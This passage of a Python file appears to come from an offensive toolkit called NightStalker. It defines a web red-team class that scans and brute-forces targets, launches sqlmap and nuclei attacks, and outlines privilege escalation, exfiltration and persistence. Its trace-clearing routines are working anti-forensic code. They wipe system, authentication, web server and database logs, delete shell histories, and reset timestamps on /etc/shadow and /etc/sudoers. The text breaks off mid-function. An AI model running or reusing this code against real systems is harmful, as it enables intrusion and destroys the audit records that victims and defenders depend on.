"""
Enhanced Web Red Teaming module for NightStalker
Provides comprehensive web scanning, exploitation, post-exploitation, and trace clearing
"""

import os
import sys
import subprocess
import requests
import json
import time
import hashlib
import base64
from pathlib import Path
from typing import Dict, List, Optional, Any
import logging

from nightstalker.utils.tool_manager import ToolManager

logger = logging.getLogger(__name__)

class WebRedTeam:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {}
        self.target_info = {}
        # Initialize required tools
        self._init_tools()
    
    def _init_tools(self):
        """Initialize and check required external tools"""
        required_tools = ['sqlmap', 'nuclei', 'ffuf', 'gobuster', 'nikto', 'wpscan']
        logger.info("Checking required tools for WebRed module...")
        ToolManager.check_and_install_tools(required_tools, logger)
    
    def scan(self, url: str, modules: Optional[List[str]] = None) -> Dict[str, Any]:
        """Comprehensive web reconnaissance and enumeration"""
        print(f"[WebRed] Starting comprehensive scan of {url}")
        
        if modules is None or 'all' in (modules or []):
            modules = ['recon', 'enum', 'vuln', 'tech', 'dir', 'subdomain']
        
        scan_results = {
            'url': url,
            'timestamp': time.time(),
            'modules': modules,
            'findings': {}
        }
        
        # Phase 1: Basic Reconnaissance
        if 'recon' in modules:
            scan_results['findings']['recon'] = self._basic_recon(url)
        
        # Phase 2: Technology Enumeration
        if 'tech' in modules:
            scan_results['findings']['tech'] = self._tech_enumeration(url)
        
        # Phase 3: Directory Enumeration
        if 'dir' in modules:
            scan_results['findings']['dir'] = self._directory_enumeration(url)
        
        # Phase 4: Subdomain Enumeration
        if 'subdomain' in modules:
            scan_results['findings']['subdomain'] = self._subdomain_enumeration(url)
        
        # Phase 5: Vulnerability Scanning
        if 'vuln' in modules:
            scan_results['findings']['vuln'] = self._vulnerability_scan(url)
        
        # Phase 6: Advanced Enumeration
        if 'enum' in modules:
            scan_results['findings']['enum'] = self._advanced_enumeration(url)
        
        self.results = scan_results
        return scan_results
    
    def _basic_recon(self, url: str) -> Dict[str, Any]:
        """Basic reconnaissance and information gathering"""
        print("  [Recon] Gathering basic information...")
        
        try:
            response = self.session.get(url, timeout=10)
            headers = dict(response.headers)
            
            # Extract server information
            server_info = {
                'server': headers.get('Server', 'Unknown'),
                'powered_by': headers.get('X-Powered-By', 'Unknown'),
                'status_code': response.status_code,
                'content_length': len(response.content),
                'content_type': headers.get('Content-Type', 'Unknown'),
                'technologies': self._detect_technologies(response),
                'robots_txt': self._check_robots(url),
                'sitemap': self._check_sitemap(url),
                'dns_info': self._get_dns_info(url)
            }
            
            return server_info
            
        except Exception as e:
            logger.error(f"Basic recon failed: {e}")
            return {'error': str(e)}
    
    def _tech_enumeration(self, url: str) -> Dict[str, Any]:
        """Technology stack enumeration"""
        print("  [Tech] Enumerating technology stack...")
        
        try:
            response = self.session.get(url, timeout=10)
            tech_stack = {
                'frameworks': self._detect_frameworks(response),
                'cms': self._detect_cms(response),
                'languages': self._detect_languages(response),
                'databases': self._detect_databases(response),
                'web_servers': self._detect_web_servers(response),
                'security_headers': self._check_security_headers(response)
            }
            
            return tech_stack
            
        except Exception as e:
            logger.error(f"Tech enumeration failed: {e}")
            return {'error': str(e)}
    
    def _directory_enumeration(self, url: str) -> Dict[str, Any]:
        """Directory and file enumeration"""
        print("  [Dir] Enumerating directories and files...")
        
        common_dirs = [
            'admin', 'administrator', 'backup', 'config', 'db', 'debug',
            'dev', 'files', 'images', 'includes', 'js', 'lib', 'log',
            'logs', 'media', 'old', 'php', 'private', 'src', 'sql',
            'temp', 'test', 'tmp', 'upload', 'uploads', 'web', 'www'
        ]
        
        common_files = [
            '.htaccess', '.htpasswd', '.env', 'config.php', 'wp-config.php',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            'web.config', 'phpinfo.php', 'info.php', 'test.php'
        ]
        
        found_items = {'directories': [], 'files': []}
        
        # Check directories
        for directory in common_dirs:
            try:
                check_url = f"{url.rstrip('/')}/{directory}/"
                response = self.session.get(check_url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_items['directories'].append({
                        'path': directory,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
            except:
                continue
        
        # Check files
        for file in common_files:
            try:
                check_url = f"{url.rstrip('/')}/{file}"
                response = self.session.get(check_url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_items['files'].append({
                        'path': file,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
            except:
                continue
        
        return found_items
    
    def _subdomain_enumeration(self, url: str) -> Dict[str, Any]:
        """Subdomain enumeration"""
        print("  [Subdomain] Enumerating subdomains...")
        
        # Extract domain from URL
        from urllib.parse import urlparse
        parsed = urlparse(url)
        domain = parsed.netloc
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test', 'staging',
            'api', 'cdn', 'static', 'img', 'images', 'media', 'support',
            'help', 'docs', 'wiki', 'forum', 'shop', 'store', 'app'
        ]
        
        found_subdomains = []
        
        for subdomain in common_subdomains:
            try:
                check_domain = f"{subdomain}.{domain}"
                check_url = f"http://{check_domain}"
                response = self.session.get(check_url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_subdomains.append({
                        'subdomain': check_domain,
                        'status': response.status_code,
                        'title': self._extract_title(response.text)
                    })
            except:
                continue
        
        return {'subdomains': found_subdomains}
    
    def _vulnerability_scan(self, url: str) -> Dict[str, Any]:
        """Vulnerability scanning"""
        print("  [Vuln] Scanning for vulnerabilities...")
        
        vulns = {
            'sql_injection': self._check_sql_injection(url),
            'xss': self._check_xss(url),
            'lfi': self._check_lfi(url),
            'rfi': self._check_rfi(url),
            'open_redirect': self._check_open_redirect(url),
            'ssrf': self._check_ssrf(url),
            'csrf': self._check_csrf(url)
        }
        
        return vulns
    
    def _advanced_enumeration(self, url: str) -> Dict[str, Any]:
        """Advanced enumeration techniques"""
        print("  [Enum] Advanced enumeration...")
        
        advanced_findings = {
            'endpoints': self._find_endpoints(url),
            'parameters': self._find_parameters(url),
            'backup_files': self._find_backup_files(url),
            'version_info': self._find_version_info(url),
            'error_pages': self._analyze_error_pages(url)
        }
        
        return advanced_findings
    
    def exploit(self, url: str, exploit_type: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute exploitation based on type"""
        print(f"[WebRed] Executing {exploit_type} exploit on {url}")
        
        exploit_methods = {
            'sqlmap': self._sqlmap_exploit,
            'xss': self._xss_exploit,
            'lfi': self._lfi_exploit,
            'rfi': self._rfi_exploit,
            'upload': self._upload_exploit
        }
        
        if exploit_type in exploit_methods:
            return exploit_methods[exploit_type](url, payload or '')
        else:
            return {'error': f'Unknown exploit type: {exploit_type}'}
    
    def post_exploitation(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Post-exploitation activities"""
        print("[WebRed] Starting post-exploitation phase...")
        
        post_exploit = {
            'timestamp': time.time(),
            'activities': {}
        }
        
        # 1. Privilege Escalation
        post_exploit['activities']['privilege_escalation'] = self._privilege_escalation(target_info)
        
        # 2. Lateral Movement
        post_exploit['activities']['lateral_movement'] = self._lateral_movement(target_info)
        
        # 3. Data Exfiltration
        post_exploit['activities']['data_exfiltration'] = self._data_exfiltration(target_info)
        
        # 4. Persistence
        post_exploit['activities']['persistence'] = self._establish_persistence(target_info)
        
        # 5. Root Access
        post_exploit['activities']['root_access'] = self._gain_root_access(target_info)
        
        return post_exploit
    
    def _privilege_escalation(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt privilege escalation"""
        print("    [Post-Exploit] Attempting privilege escalation...")
        
        escalation_attempts = {
            'sudo_privileges': self._check_sudo_privileges(),
            'suid_binaries': self._find_suid_binaries(),
            'capabilities': self._check_capabilities(),
            'kernel_exploits': self._check_kernel_vulnerabilities(),
            'cron_jobs': self._check_cron_jobs(),
            'environment_variables': self._check_env_variables()
        }
        
        return escalation_attempts
    
    def _gain_root_access(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Gain root access to the server"""
        print("    [Post-Exploit] Attempting to gain root access...")
        
        root_attempts = {
            'kernel_exploits': self._try_kernel_exploits(),
            'sudo_exploitation': self._try_sudo_exploitation(),
            'suid_exploitation': self._try_suid_exploitation(),
            'capability_exploitation': self._try_capability_exploitation(),
            'cron_exploitation': self._try_cron_exploitation(),
            'service_exploitation': self._try_service_exploitation()
        }
        
        return root_attempts
    
    def clear_traces(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Clear all traces of the attack"""
        print("[WebRed] Clearing all traces...")
        
        trace_clearing = {
            'timestamp': time.time(),
            'activities': {}
        }
        
        # 1. Clear Log Files
        trace_clearing['activities']['log_clearing'] = self._clear_log_files()
        
        # 2. Clear History Files
        trace_clearing['activities']['history_clearing'] = self._clear_history_files()
        
        # 3. Clear Temporary Files
        trace_clearing['activities']['temp_clearing'] = self._clear_temp_files()
        
        # 4. Clear Web Server Logs
        trace_clearing['activities']['web_logs_clearing'] = self._clear_web_logs()
        
        # 5. Clear Database Logs
        trace_clearing['activities']['db_logs_clearing'] = self._clear_database_logs()
        
        # 6. Clear Network Traces
        trace_clearing['activities']['network_clearing'] = self._clear_network_traces()
        
        # 7. Clear File Timestamps
        trace_clearing['activities']['timestamp_clearing'] = self._clear_file_timestamps()
        
        return trace_clearing
    
    def _clear_log_files(self) -> Dict[str, Any]:
        """Clear system log files"""
        log_files = [
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/btmp',
            '/var/log/wtmp',
            '/var/log/utmp'
        ]
        
        cleared = []
        for log_file in log_files:
            try:
                if os.path.exists(log_file):
                    # Clear file contents
                    with open(log_file, 'w') as f:
                        f.write('')
                    cleared.append(log_file)
            except:
                continue
        
        return {'cleared_files': cleared}
    
    def _clear_history_files(self) -> Dict[str, Any]:
        """Clear user history files"""
        history_files = [
            '~/.bash_history',
            '~/.zsh_history',
            '~/.python_history',
            '~/.mysql_history',
            '~/.psql_history'
        ]
        
        cleared = []
        for hist_file in history_files:
            try:
                expanded_path = os.path.expanduser(hist_file)
                if os.path.exists(expanded_path):
                    os.remove(expanded_path)
                    cleared.append(hist_file)
            except:
                continue
        
        return {'cleared_files': cleared}
    
    def _clear_temp_files(self) -> Dict[str, Any]:
        """Clear temporary files"""
        temp_dirs = [
            '/tmp',
            '/var/tmp',
            '/dev/shm'
        ]
        
        cleared = []
        for temp_dir in temp_dirs:
            try:
                if os.path.exists(temp_dir):
                    # Remove suspicious files
                    for file in os.listdir(temp_dir):
                        file_path = os.path.join(temp_dir, file)
                        if os.path.isfile(file_path):
                            # Check for suspicious patterns
                            if any(pattern in file.lower() for pattern in ['shell', 'backdoor', 'exploit', 'payload']):
                                os.remove(file_path)
                                cleared.append(file_path)
            except:
                continue
        
        return {'cleared_files': cleared}
    
    def _clear_web_logs(self) -> Dict[str, Any]:
        """Clear web server logs"""
        web_logs = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log'
        ]
        
        cleared = []
        for log_file in web_logs:
            try:
                if os.path.exists(log_file):
                    # Clear file contents
                    with open(log_file, 'w') as f:
                        f.write('')
                    cleared.append(log_file)
            except:
                continue
        
        return {'cleared_files': cleared}
    
    def _clear_database_logs(self) -> Dict[str, Any]:
        """Clear database logs"""
        db_logs = [
            '/var/log/mysql/error.log',
            '/var/log/postgresql/postgresql-*.log',
            '/var/log/mongodb/mongod.log'
        ]
        
        cleared = []
        for log_pattern in db_logs:
            try:
                import glob
                for log_file in glob.glob(log_pattern):
                    if os.path.exists(log_file):
                        with open(log_file, 'w') as f:
                            f.write('')
                        cleared.append(log_file)
            except:
                continue
        
        return {'cleared_files': cleared}
    
    def _clear_network_traces(self) -> Dict[str, Any]:
        """Clear network traces"""
        network_activities = {
            'arp_cache': self._clear_arp_cache(),
            'connection_history': self._clear_connection_history(),
            'dns_cache': self._clear_dns_cache()
        }
        
        return network_activities
    
    def _clear_file_timestamps(self) -> Dict[str, Any]:
        """Clear file timestamps"""
        timestamp_clearing = {
            'modified_files': [],
            'accessed_files': []
        }
        
        # List of files that might have been modified
        suspicious_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/etc/crontab',
            '/var/spool/cron/crontabs/root'
        ]
        
        for file_path in suspicious_files:
            try:
                if os.path.exists(file_path):
                    # Reset timestamps to system default
                    current_time = time.time()
                    os.utime(file_path, (current_time, current_time))
                    timestamp_clearing['modified_files'].append(file_path)
            except:
                continue
        
        return timestamp_clearing
    
    # Helper methods for detection and exploitation
    def _detect_technologies(self, response) -> List[str]:
        """Detect technologies from response"""
        technologies = []
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        tech_patterns = {
            'PHP': ['php', 'x-powered-by: php'],
            'Python': ['python', 'django', 'flask', 'wsgi'],
            'Node.js': ['node.js', 'express', 'npm'],
            'Java': ['java', 'jsp', 'servlet', 'spring'],
            'ASP.NET': ['asp.net', 'iis', 'microsoft'],
            'Ruby': ['ruby', 'rails', 'rack'],
            'WordPress': ['wordpress', 'wp-content', 'wp-includes'],
            'Drupal': ['drupal', 'drupal.js'],
            'Joomla': ['joomla', 'joomla.js'],
            'Magento': ['magento', 'mage.js']
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in content or pattern in headers:
                    technologies.append(tech)
                    break
        
        return technologies
    
    def _extract_title(self, html: str) -> str:
        """Extract page title from HTML"""
        import re
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return title_match.group(1) if title_match else 'No title'
    
    def _get_dns_info(self, url: str) -> Dict[str, Any]:
        """Get DNS information"""
        try:
            import socket
            from urllib.parse import urlparse
            
            parsed = urlparse(url)
            domain = parsed.netloc
            
            dns_info = {
                'ip': socket.gethostbyname(domain),
                'hostname': socket.gethostbyaddr(socket.gethostbyname(domain))[0]
            }
            
            return dns_info
        except:
            return {'error': 'DNS lookup failed'}
    
    def _check_robots(self, url: str) -> Dict[str, Any]:
        """Check robots.txt"""
        try:
            robots_url = f"{url.rstrip('/')}/robots.txt"
            response = self.session.get(robots_url, timeout=5)
            if response.status_code == 200:
                return {'exists': True, 'content': response.text[:500]}
            return {'exists': False}
        except:
            return {'exists': False, 'error': 'Failed to check robots.txt'}
    
    def _check_sitemap(self, url: str) -> Dict[str, Any]:
        """Check sitemap.xml"""
        try:
            sitemap_url = f"{url.rstrip('/')}/sitemap.xml"
            response = self.session.get(sitemap_url, timeout=5)
            if response.status_code == 200:
                return {'exists': True, 'content': response.text[:500]}
            return {'exists': False}
        except:
            return {'exists': False, 'error': 'Failed to check sitemap.xml'}
    
    # Placeholder methods for exploitation (to be implemented)
    def _sqlmap_exploit(self, url: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute SQLMap exploitation"""
        try:
            if not ToolManager.is_tool_installed('sqlmap'):
                return {'method': 'sqlmap', 'status': 'error', 'message': 'SQLMap not installed'}
            
            cmd = ['sqlmap', '-u', url, '--batch', '--random-agent', '--level=1', '--risk=1']
            
            if payload:
                cmd.extend(['--data', payload])
            
            logger.info(f"Running SQLMap: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'method': 'sqlmap',
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'method': 'sqlmap', 'status': 'timeout'}
        except Exception as e:
            logger.error(f"SQLMap exploitation failed: {e}", exc_info=True)
            return {'method': 'sqlmap', 'status': 'error', 'message': str(e)}
    
    def _xss_exploit(self, url: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute XSS exploitation using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'method': 'xss', 'status': 'error', 'message': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'xss', '-silent', '-json']
            
            logger.info(f"Running Nuclei XSS scan: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'method': 'xss',
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'method': 'xss', 'status': 'timeout'}
        except Exception as e:
            logger.error(f"XSS exploitation failed: {e}", exc_info=True)
            return {'method': 'xss', 'status': 'error', 'message': str(e)}
    
    def _lfi_exploit(self, url: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute LFI exploitation using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'method': 'lfi', 'status': 'error', 'message': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'lfi', '-silent', '-json']
            
            logger.info(f"Running Nuclei LFI scan: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'method': 'lfi',
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'method': 'lfi', 'status': 'timeout'}
        except Exception as e:
            logger.error(f"LFI exploitation failed: {e}", exc_info=True)
            return {'method': 'lfi', 'status': 'error', 'message': str(e)}
    
    def _rfi_exploit(self, url: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute RFI exploitation using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'method': 'rfi', 'status': 'error', 'message': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'rfi', '-silent', '-json']
            
            logger.info(f"Running Nuclei RFI scan: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'method': 'rfi',
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'method': 'rfi', 'status': 'timeout'}
        except Exception as e:
            logger.error(f"RFI exploitation failed: {e}", exc_info=True)
            return {'method': 'rfi', 'status': 'error', 'message': str(e)}
    
    def _upload_exploit(self, url: str, payload: Optional[str] = None) -> Dict[str, Any]:
        """Execute file upload exploitation using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'method': 'upload', 'status': 'error', 'message': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'file-upload', '-silent', '-json']
            
            logger.info(f"Running Nuclei file upload scan: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'method': 'upload',
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'method': 'upload', 'status': 'timeout'}
        except Exception as e:
            logger.error(f"File upload exploitation failed: {e}", exc_info=True)
            return {'method': 'upload', 'status': 'error', 'message': str(e)}
    
    # Placeholder methods for vulnerability testing
    def _check_sql_injection(self, url: str) -> Dict[str, Any]:
        """Check for SQL injection using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'sqli', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"SQL injection check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_xss(self, url: str) -> Dict[str, Any]:
        """Check for XSS using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'xss', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"XSS check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_lfi(self, url: str) -> Dict[str, Any]:
        """Check for LFI using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'lfi', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"LFI check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_rfi(self, url: str) -> Dict[str, Any]:
        """Check for RFI using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'rfi', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"RFI check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_open_redirect(self, url: str) -> Dict[str, Any]:
        """Check for open redirect vulnerabilities using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'redirect', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"Open redirect check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_ssrf(self, url: str) -> Dict[str, Any]:
        """Check for SSRF vulnerabilities using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'ssrf', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"SSRF check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    def _check_csrf(self, url: str) -> Dict[str, Any]:
        """Check for CSRF vulnerabilities using Nuclei"""
        try:
            if not ToolManager.is_tool_installed('nuclei'):
                return {'vulnerable': False, 'method': 'nuclei', 'error': 'Nuclei not installed'}
            
            cmd = ['nuclei', '-u', url, '-t', 'csrf', '-silent', '-json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerable = result.returncode == 0 and result.stdout.strip()
            return {
                'vulnerable': vulnerable,
                'method': 'nuclei',
                'output': result.stdout,
                'returncode': result.returncode
            }
        except Exception as e:
            logger.error(f"CSRF check failed: {e}", exc_info=True)
            return {'vulnerable': False, 'method': 'nuclei', 'error': str(e)}
    
    # Advanced enumeration methods
    def _find_endpoints(self, url: str) -> Dict[str, Any]:
        """Find API endpoints and hidden paths using ffuf"""
        try:
            if not ToolManager.is_tool_installed('ffuf'):
                return {'endpoints': [], 'method': 'ffuf', 'error': 'ffuf not installed'}
            
            # Common wordlist for endpoint discovery
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            if not os.path.exists(wordlist):
                wordlist = '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
            
            if not os.path.exists(wordlist):
                # Fallback to basic common endpoints
                common_endpoints = ['api', 'admin', 'login', 'logout', 'register', 'profile', 'dashboard', 'config', 'backup', 'test']
                return {'endpoints': common_endpoints, 'method': 'builtin'}
            
            cmd = ['ffuf', '-u', f'{url}/FUZZ', '-w', wordlist, '-mc', '200,204,301,302,307,401,403', '-s', '-o', '/tmp/ffuf_results.json', '-of', 'json']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            endpoints = []
            if result.returncode == 0 and os.path.exists('/tmp/ffuf_results.json'):
                try:
                    with open('/tmp/ffuf_results.json', 'r') as f:
                        data = json.load(f)
                        for result in data.get('results', []):
                            endpoints.append(result.get('input', {}).get('FUZZ', ''))
                except:
                    pass
                os.remove('/tmp/ffuf_results.json')
            
            return {
                'endpoints': endpoints,
                'method': 'ffuf',
                'total_found': len(endpoints)
            }
        except Exception as e:
            logger.error(f"Endpoint discovery failed: {e}", exc_info=True)
            return {'endpoints': [], 'method': 'ffuf', 'error': str(e)}
    
    def _find_parameters(self, url: str) -> Dict[str, Any]:
        """Find URL parameters using common patterns"""
        try:
            # Common parameter patterns
            common_params = ['id', 'page', 'search', 'q', 'query', 'file', 'path', 'dir', 'folder', 'name', 'user', 'email', 'password', 'token', 'key', 'api_key', 'session', 'lang', 'locale', 'theme', 'debug', 'test', 'admin', 'mode', 'action', 'method', 'type', 'format', 'callback', 'jsonp']
            
            # Test for parameter reflection
            found_params = []
            for param in common_params:
                test_url = f"{url}?{param}=test"
                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=False)
                    if response.status_code in [200, 400, 500]:  # Parameter might be reflected
                        found_params.append(param)
                except:
                    continue
            
            return {
                'parameters': found_params,
                'method': 'reflection_test',
                'total_found': len(found_params)
            }
        except Exception as e:
            logger.error(f"Parameter discovery failed: {e}", exc_info=True)
            return {'parameters': [], 'method': 'reflection_test', 'error': str(e)}
    
    def _find_backup_files(self, url: str) -> Dict[str, Any]:
        """Find backup and configuration files"""
        try:
            backup_extensions = ['.bak', '.backup', '.old', '.orig', '.save', '.swp', '.tmp', '.temp', '.log', '.conf', '.config', '.ini', '.env', '.htaccess', '.htpasswd', 'robots.txt', 'sitemap.xml', '.git/config', '.svn/entries']
            
            found_files = []
            for ext in backup_extensions:
                test_url = f"{url}{ext}"
                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=False)
                    if response.status_code == 200:
                        found_files.append({
                            'url': test_url,
                            'status_code': response.status_code,
                            'size': len(response.content)
                        })
                except:
                    continue
            
            return {
                'backup_files': found_files,
                'method': 'extension_brute_force',
                'total_found': len(found_files)
            }
        except Exception as e:
            logger.error(f"Backup file discovery failed: {e}", exc_info=True)
            return {'backup_files': [], 'method': 'extension_brute_force', 'error': str(e)}
    
    def _find_version_info(self, url: str) -> Dict[str, Any]:
        """Extract version information from headers and responses"""
        try:
            version_info = {}
            
            # Check headers for version info
            try:
                response = requests.get(url, timeout=10, allow_redirects=False)
                headers = response.headers
                
                # Common version headers
                version_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-php-version', 'x-runtime', 'x-version']
                for header in version_headers:
                    if header in headers:
                        version_info[header] = headers[header]
                
                # Check for version in response body
                if 'version' in response.text.lower():
                    # Simple regex to find version patterns
                    import re
                    version_patterns = [
                        r'version["\']?\s*[:=]\s*["\']?([\d.]+)',
                        r'v[\d.]+',
                        r'[\d]+\.[\d]+\.[\d]+'
                    ]
                    
                    for pattern in version_patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            version_info['body_versions'] = matches[:5]  # Limit to first 5 matches
                            break
                
            except Exception as e:
                version_info['error'] = str(e)
            
            return {
                'version_info': version_info,
                'method': 'header_and_body_analysis'
            }
        except Exception as e:
            logger.error(f"Version info extraction failed: {e}", exc_info=True)
            return {'version_info': {}, 'method': 'header_and_body_analysis', 'error': str(e)}
    
    def _analyze_error_pages(self, url: str) -> Dict[str, Any]:
        """Analyze error pages for information disclosure"""
        try:
            error_pages = []
            
            # Test common error-inducing paths
            error_paths = [
                '/nonexistent', '/admin/nonexistent', '/api/nonexistent',
                '/test', '/debug', '/phpinfo.php', '/info.php',
                '/.env', '/config.php', '/wp-config.php'
            ]
            
            for path in error_paths:
                test_url = f"{url}{path}"
                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=False)
                    if response.status_code in [400, 401, 403, 404, 500, 502, 503]:
                        error_info = {
                            'url': test_url,
                            'status_code': response.status_code,
                            'content_length': len(response.content),
                            'has_stack_trace': 'stack trace' in response.text.lower() or 'exception' in response.text.lower(),
                            'has_path_info': '/' in response.text or '\\' in response.text,
                            'has_version_info': any(x in response.text.lower() for x in ['version', 'php', 'apache', 'nginx', 'mysql'])
                        }
                        error_pages.append(error_info)
                except:
                    continue
            
            return {
                'error_pages': error_pages,
                'method': 'error_analysis',
                'total_found': len(error_pages)
            }
        except Exception as e:
            logger.error(f"Error page analysis failed: {e}", exc_info=True)
            return {'error_pages': [], 'method': 'error_analysis', 'error': str(e)}
    
    # Post-exploitation methods
    def _check_sudo_privileges(self) -> Dict[str, Any]:
        """Check for sudo privileges and exploitable commands"""
        try:
            import subprocess
            
            # Check if we can run sudo
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=30)
            
